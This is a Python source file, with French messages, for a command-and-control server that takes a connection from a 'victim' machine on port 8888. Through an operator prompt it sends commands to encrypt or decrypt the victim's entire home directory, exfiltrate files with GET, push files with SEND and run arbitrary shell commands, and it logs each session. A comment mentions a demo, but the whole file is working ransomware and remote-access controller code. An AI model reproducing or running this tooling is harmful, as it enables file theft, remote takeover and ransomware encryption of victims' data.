import socket, os
from datetime import datetime

def start_c2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8888))
    s.listen(5)
    print("[*] SERVEUR C2 PRET - En attente de connexion...")

    conn, addr = s.accept()
    v_info = conn.recv(1024).decode()
    print(f"\n[+] VICTIME CONNECTEE : {v_info}")
    
    # --- LE MENU D'AIDE (Maintenu pour la démo) ---
    print("\n--- COMMANDES DISPONIBLES ---")
    print("  ENCRYPT / DECRYPT : Cible tout le HOME de l'utilisateur")
    print("  GET <chemin>      : Exfiltrer un fichier")
    print("  SEND <chemin>     : Infiltrer un fichier")
    print("  <cmd systeme>     : ls, whoami, pwd, etc.")
    print("  exit              : Fermer la session")
    print("------------------------------")

    with open("c2_history.log", "a") as f_log:
        f_log.write(f"[{datetime.now()}] CONNEXION : {addr} | {v_info}\n")

    while True:
        cmd = input("\nC2 >> ")
        if not cmd: continue
        
        conn.send(cmd.encode())
        if cmd == "exit": break

        if cmd.startswith("GET "):
            size = conn.recv(1024).decode()
            with open("c2_history.log", "a") as f_log:
                if "ERREUR" in size:
                    f_log.write(f"[{datetime.now()}] ECHEC GET : {cmd} | {size}\n")
                    print(size)
                else:
                    conn.send(b"READY")
                    data = b""
                    while len(data) < int(size): data += conn.recv(4096)
                    name = "exfil_" + os.path.basename(cmd.split()[1])
                    with open(name, "wb") as f: f.write(data)
                    f_log.write(f"[{datetime.now()}] SUCCES GET : {name} ({size} octets)\n")
                    print(f"[+] Succes: {name} sauvegarde localement.")

        elif cmd.startswith("SEND "):
            p = cmd.split()[1]
            with open("c2_history.log", "a") as f_log:
                if os.path.exists(p):
                    with open(p, "rb") as f: content = f.read()
                    conn.send(str(len(content)).encode())
                    if conn.recv(1024).decode() == "READY":
                        conn.sendall(content)
                    res = conn.recv(1024).decode()
                    f_log.write(f"[{datetime.now()}] SUCCES SEND : {p} | {res}\n")
                    print(f"[CLIENT]: {res}")
                else:
                    f_log.write(f"[{datetime.now()}] ECHEC SEND : {p} introuvable\n")
                    print("[-] Erreur: Fichier introuvable localement.")
        
        else:
            reponse = conn.recv(8192).decode()
            with open("c2_history.log", "a") as f_log:
                f_log.write(f"[{datetime.now()}] CMD: {cmd} | RETOUR: {reponse[:100]}...\n")
            print(f"\n[CLIENT]:\n{reponse}")

    conn.close()

if __name__ == "__main__":
    start_c2()
